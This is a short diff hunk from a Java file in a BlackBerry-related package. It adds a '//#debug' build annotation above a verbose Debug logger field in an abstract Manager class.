@@ -26,6 +26,7 @@ import com.ht.rcs.blackberry.utils.Utils;
  */
 public abstract class Manager {
 
+	//#debug
     private static Debug debug = new Debug("Manager", DebugLevel.VERBOSE);
 
     /** The status obj. */
